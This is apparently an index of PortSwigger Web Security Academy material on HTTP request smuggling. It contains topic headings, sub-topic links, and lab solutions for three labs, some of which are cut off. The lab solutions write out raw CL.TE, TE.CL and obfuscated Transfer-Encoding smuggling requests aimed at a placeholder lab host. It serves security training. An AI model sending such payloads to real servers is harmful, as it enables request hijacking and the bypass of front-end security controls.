# PortSwigger WSA — HTTP Request Smuggling
Source: https://portswigger.net/web-security/request-smuggling

## Technique headings
- HTTP request smuggling
- Labs
- What is HTTP request smuggling?
- PortSwigger Research
- What happens in an HTTP request smuggling attack?
- How do HTTP request smuggling vulnerabilities arise?
- Note
- How to perform an HTTP request smuggling attack
- CL.TE vulnerabilities
- TE.CL vulnerabilities
- TE.TE behavior: obfuscating the TE header
- How to identify HTTP request smuggling vulnerabilities
- Read more
- How to exploit HTTP request smuggling vulnerabilities
- Advanced HTTP request smuggling
- Browser-powered request smuggling
- How to prevent HTTP request smuggling vulnerabilities
- Find HTTP request smuggling vulnerabilities using Burp Suite

## Sub-topic pages
- https://portswigger.net/web-security/request-smuggling/advanced
- https://portswigger.net/web-security/request-smuggling/browser
- https://portswigger.net/web-security/request-smuggling/exploiting
- https://portswigger.net/web-security/request-smuggling/finding


## Labs (2026-10-18 — per-lab scenarios & solutions), 3 lab)

- **HTTP request smuggling, basic CL.TE vulnerability** (`lab-basic-cl-te`)
  - Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G The second response should say: Unrecognized method GPOST .
- **HTTP request smuggling, basic TE.CL vulnerability** (`lab-basic-te-cl`)
  - In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 Note You need t
- **HTTP request smuggling, obfuscating the TE header** (`lab-obfuscating-te-header`)
  - In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 1
